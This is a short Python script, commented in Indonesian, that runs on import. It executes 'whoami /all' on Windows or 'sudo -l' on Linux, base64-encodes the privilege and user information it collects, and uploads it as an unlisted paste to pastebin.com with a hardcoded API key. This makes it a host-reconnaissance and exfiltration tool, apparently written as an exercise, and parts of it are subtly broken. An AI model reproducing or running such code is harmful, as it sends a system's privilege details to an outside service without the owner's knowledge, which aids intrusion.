import subprocess
import base64
import requests
import platform

# referensi
# ===========
# https://pastebin.com/doc_api#1
# https://books.google.co.id/books?id=V4XwDwAAQBAJ&pg=PA146&lpg=PA146&dq=pastebin+getting+a+users+information+and+settings+in+python&source=bl&ots=xzhgBYT70T&sig=ACfU3U1eyTUmn4r1ZkWv2K8IkVA-KIFnzg&hl=en&sa=X&ved=2ahUKEwjzrPnn-uX0AhWZ63MBHfSMAEgQ6AF6BAgbEAM#v=onepage&q=pastebin%20getting%20a%20users%20information%20and%20settings%20in%20python&f=false


def upload_data(datas):
    # url untuk mengirimkan/upload (POST) pastein API key [untuk membuat sebuah paste baru]
    url = 'https://pastebin.com/api/api_post.php'
    api_data = {
            # berisikan API yang dimiliki dari pastebin
            'pastebin_api': "pYa2W8sTgvLlfwrCUdT6K_HscP16dbj6",
            'api_name': 'updat',
            'api_paste_code': datas,
            # mode pada api paste 
            # 0 => public; 1 => unlisted; 2 => private
            'paste_mode': 1,
            # Paste text kita
            'api_option': "paste",
        }

    try:    
        # melakukan request untuk post api_data
        send = requests.post(url,data=api_data)
        print("The result: \n" + send.text)
    except:
        print(Exception)

# untuk melakukan system check
def systemcheck():
    text = []
    if platform.system() == 'Windows':
        process = subprocess.Popen('whoami /all', stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        res, error = process.communicate()

    elif platform.system() == 'Linux':
        process = subprocess.Popen('sudo -l', stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        res, error = process.communicate()
    
    # untuk memasukan informasi host ke dalam text
    if res == b'':
        text += error.decode()
    else:
        text += res.decode()

    # melakukan encoding
    Message = base64.b64encode(text.encode())
    upload_data(Message)

systemcheck()
